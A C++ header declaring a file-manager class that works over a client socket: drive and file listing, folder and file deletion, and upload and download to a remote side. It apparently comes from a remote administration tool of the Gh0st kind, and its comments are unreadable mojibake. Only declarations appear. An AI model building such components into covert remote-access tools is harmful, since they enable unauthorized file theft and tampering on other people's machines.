#include "stdafx.h"
#include "Manager.h"
#include <list>
#include <string>
enum{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������

};
class CFileManager : public CManager
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	CFileManager(CClientSocket *pClient,UINT ID);
	virtual ~CFileManager();
	UINT	m_ID;
	wchar_t m_sendFileName[MAX_PATH];				 //file will send to server
	
private:
	bool DeleteDic(wchar_t* pDic);
public:
	list <wstring> m_UploadList;
	UINT m_nTransferMode;
	wchar_t m_strCurrentProcessFileName[MAX_PATH];	// ��ǰ���ڴ�����ļ�
	__int64 m_nCurrentProcessFileLength;			// ��ǰ���ڴ�����ļ��ĳ���
public:
	UINT SendDriveList();
	void SendFilesList(LPBYTE recvData);
	void OnCreateFolder(LPBYTE recvData);
	void OnDeleteFolder(LPBYTE recvData);
	void OnDeleteFile(LPBYTE recvData);
	void OnCreateFile(LPBYTE recvData);
	bool OnDownloadFile(LPBYTE recvData);
	bool FixedUploadList(LPCTSTR lpszDirectory);
	void StopTransfer();
	int  SendToken(int bToken);
	UINT SendFileSize(LPCTSTR lpszFileName);
	UINT SendFileData(LPBYTE lpBuffer);
	void UploadNext();
	bool UploadToRemote(LPBYTE lpBuffer);
};